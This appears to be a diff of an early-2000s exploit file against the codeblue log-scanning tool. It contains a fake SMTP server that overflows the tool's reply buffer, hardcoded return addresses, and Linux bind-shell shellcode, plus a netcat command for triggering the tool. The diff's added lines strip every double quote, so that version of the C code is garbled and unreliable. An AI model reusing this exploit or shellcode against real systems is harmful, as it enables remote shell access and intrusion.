@@ -46,8 +46,8 @@ btw).
 in general i received no feedback from this, cept from one guy having problems
 downloading it (howd that go btw?) and then this:
 
-From: "Michael"
-To: "'Demi Sex God from Hell'"
+From: Michael
+To: 'Demi Sex God from Hell'
 Subject: RE: ass the attack spoofing shell
 
 Annoying. Pointless.
@@ -163,7 +163,7 @@ int scan_file(FILE * fp)
 /* line ~827 */
 
 char reply[512]; /* global */
-char whoispath[512] = "/usr/bin/whois"; /* global */
+char whoispath[512] = /usr/bin/whois; /* global */
 
 int main(int argc, char **argv)
 {
@@ -241,7 +241,7 @@ int get_smtp_reply(int sd)
     while (TRUE) {
         if (select((sd + 1), &rset, NULL, NULL, &tv) < 0) {
             if (errno != EINPROGRESS) {
-                fprintf(stderr, "[ ERROR: select() failed: %s\n",
+                fprintf(stderr, [ ERROR: select() failed: %s\n,
                         strerror(errno));
                 return -1;
             }
@@ -249,8 +249,8 @@ int get_smtp_reply(int sd)
         if (recv(sd, (int *) &response[i], 1, RECV_FL) < 0) { /* Hello */
             if (errno == EAGAIN) {
                 if (elapsed >= smtp_timeout) {
-                    fprintf(stderr, "[ ERROR: operation timed out\n");
-                    fprintf(log, "..... ERROR: operation timed out\n");
+                    fprintf(stderr, [ ERROR: operation timed out\n);
+                    fprintf(log, ..... ERROR: operation timed out\n);
                     return -1;
                 }
                 elapsed++;
@@ -258,9 +258,9 @@ int get_smtp_reply(int sd)
                 continue;
             } else {
                 if (!(flags & FL_BEQUIET))
-                    fprintf(stderr, "[ ERROR: recv() failed: %s\n",
+                    fprintf(stderr, [ ERROR: recv() failed: %s\n,
                             strerror(errno));
-                fprintf(log, "..... ERROR: recv() failed: %s\n",
+                fprintf(log, ..... ERROR: recv() failed: %s\n,
                         strerror(errno));
                 return -1;
             }
@@ -294,14 +294,14 @@ So slowly but surely, response is overrun, unless it its a newline.
  *         (InterMail vM.5.01.04.19 201-253-122-122-119-20020516) with ESMTP
  *         id <20020722195143.XJOI21884.imf10bis.bellsouth.net@Michaels>
  *         for ; Mon, 22 Jul 2002 15:51:43 -0400
- * From: "Michael"
- * To: "'Demi Sex God from Hell'"
+ * From: Michael
+ * To: 'Demi Sex God from Hell'
  * Subject: RE: ass the attack spoofing shell
  * Date: Mon, 22 Jul 2002 15:50:13 -0400
  * Message-ID: <000101c231b8$fedc7740$0200a8c0@Michaels>
  * MIME-Version: 1.0
  * Content-Type: text/plain;
- *	charset="us-ascii"
+ *	charset=us-ascii
  * Content-Transfer-Encoding: 7bit
  * X-Priority: 3 (Normal)
  * X-MSMail-Priority: Normal
@@ -322,7 +322,7 @@ So slowly but surely, response is overrun, unless it its a newline.
  *
  * To use this against a webserver (A) using codeblue.
  *
- * $ printf "GET /scripts/root.exe\r\n\r\n" | nc A 80
+ * $ printf GET /scripts/root.exe\r\n\r\n | nc A 80
  *
  * this will add an entry in the access log.
  *
@@ -376,14 +376,14 @@ So slowly but surely, response is overrun, unless it its a newline.
 /* i dont know who wrote this, sorry, if you wrote it, let me know */
 
 char lunix_shellcode[]=
-"\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8"
-"\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89"
-"\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0"
-"\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd"
-"\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9"
-"\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75"
-"\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08"
-"\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh";
+\x89\xe5\x31\xd2\xb2\x66\x89\xd0\x31\xc9\x89\xcb\x43\x89\x5d\xf8
+\x43\x89\x5d\xf4\x4b\x89\x4d\xfc\x8d\x4d\xf4\xcd\x80\x31\xc9\x89
+\x45\xf4\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x0f\x27\x89\x4d\xf0
+\x8d\x45\xec\x89\x45\xf8\xc6\x45\xfc\x10\x89\xd0\x8d\x4d\xf4\xcd
+\x80\x89\xd0\x43\x43\xcd\x80\x89\xd0\x43\xcd\x80\x89\xc3\x31\xc9
+\xb2\x3f\x89\xd0\xcd\x80\x89\xd0\x41\xcd\x80\xeb\x18\x5e\x89\x75
+\x08\x31\xc0\x88\x46\x07\x89\x45\x0c\xb0\x0b\x89\xf3\x8d\x4d\x08
+\x8d\x55\x0c\xcd\x80\xe8\xe3\xff\xff\xff/bin/sh;
 
 
 /*
@@ -408,7 +408,7 @@ int main(int argc, char *argv[])
 {
 	struct 	sockaddr_in sock_in;
 	struct 	sockaddr_in sock_out;
-	char 	*port = "25";
+	char 	*port = 25;
 	int 	fd, a;
 	int 	len;
 	int		opt;
@@ -416,17 +416,17 @@ int main(int argc, char *argv[])
 	char *p;
 	long lunix_resp = 0xbfffe0ac;
 	long bsd_resp = 0xdfbfc068;
-	char *moo = "220 ";
+	char *moo = 220 ;
 
 	long resp = lunix_resp;
 	char *shellcode = lunix_shellcode;
 
-	printf("strlen scode = %d\n", strlen(shellcode));
+	printf(strlen scode = %d\n, strlen(shellcode));
 	if (argc == 2)
 		port = argv[1];
 
 	if (argc > 2) {
-		fprintf(stderr, "usege: %s [port]\n", argv[0]);
+		fprintf(stderr, usege: %s [port]\n, argv[0]);
 		exit(1);
 	}
 
@@ -446,7 +446,7 @@ int main(int argc, char *argv[])
 	memset(p, '\n', 4);
 
 	if ((fd = socket(PF_INET, SOCK_STREAM, 0)) < 0){
-		perror("socket");
+		perror(socket);
 		exit(1);
 	}
 
@@ -458,29 +458,29 @@ int main(int argc, char *argv[])
 
 	opt = 1;
 	if (setsockopt(fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(int)) == -1) {
-			perror("setsockopt");
+			perror(setsockopt);
 			exit(1);
 	}
 
 	if (bind(fd, (struct sockaddr *)&sock_in, len) < 0) {
-		perror("bind");
+		perror(bind);
 		exit(1);
 	}
 
 	if (listen(fd, 5) < 0) {
-		perror("listen");
+		perror(listen);
 		exit(1);
 	}
 
-	printf("listening on port %d\n", atoi(port));
+	printf(listening on port %d\n, atoi(port));
 
 	for (;;) {
 		len = sizeof(sock_out);
 		if ((a = accept(fd, (struct sockaddr *)&sock_out, &len)) < 0){
-			perror("accept");
+			perror(accept);
 			exit(1);
 		}
-		printf("got a connection from %s\n", inet_ntoa(sock_out.sin_addr));
+		printf(got a connection from %s\n, inet_ntoa(sock_out.sin_addr));
 		fflush(stdout);
 
 		write(a, bigbuf, sizeof(bigbuf));
